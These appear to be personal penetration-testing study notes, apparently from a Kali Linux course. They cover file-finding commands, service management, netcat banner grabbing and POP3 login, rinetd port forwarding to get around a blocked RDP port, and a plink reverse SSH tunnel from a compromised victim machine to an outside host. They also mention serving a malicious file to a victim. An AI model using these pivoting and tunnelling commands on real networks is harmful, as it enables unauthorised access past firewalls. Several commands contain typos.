linux utilities to **find or locate** files

1. Locate command: 

Updatedb -- to update the db of the OS

Ex: locate sbd.exe

1. Which command :

Ex: which sbd : prg can be found under /usr/bin/

1. find command:

Ex: find / -name sbd\*

all files lower case sbd and file format.

find  -name sbd\* -exec file{} \;

**Services**:

passwd : change the old and weak pass to new strong password

1. SSH Services : Secure shell

EX : netstat -antp \| grep sshd

Service ssh stop

1. HTTP Server:

TCP based  and download the malicious file to victim

Ex: services apache2 start

echo "kali linux rocks" &gt; /var/www/index.html

1. services management : wrapper around /etc/init.d

4.Service persistent

update -rc.d ssh enable

update-rc.d apache2 enable

RC conf also can be used

**bash scripting**

1. cat index.html l grep "href="
2. cat index.html \| grep "href=" \| cut -d

**Essential**

netcat : network utility able to read and write to TCP and UDP ports

it can be used as TCP client or server

nc -nv 192.168.20.25 25

open

banner

HELP

SMTP list all commands

nc -nv 192.168.30.35 110

bob

password: bob

**Port Forwarding**

rinetd.conf

scenario1:

Internal PC \(Engree port 80 and 443\)

if it want to connect to remote desktop\(67.23.72.109\) it can't as RDP port is blocked.

* If we have a linux machine\(208.88.127.99\) with public IP address we need to use utility rinetd.conf
* Accept traffic of TCP port 80 and redirect to 3389

```
Bindaddress    Bindport    ConnectAddress    Connectport
208.88.127.99    80        67.23.72.109        3389

/etc/init.d/rinetd start
```

Encrypted tunnel within the ssh tunnel:

SSH Local Port forwarding \(-l\):

localport --&gt; remoteport \(Over ssh tunnel\)

Scenario2:

Initiated Client Attack \(on org\) and got shell of a internal machine \(Non routable\) -- &gt; uploaded a SSH windows client \(plink\) on vi 

on victim machine we have RDP enabled \(\)

Now tunnel the local rdp traffic to the remote port using plink

```
plink -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389
```



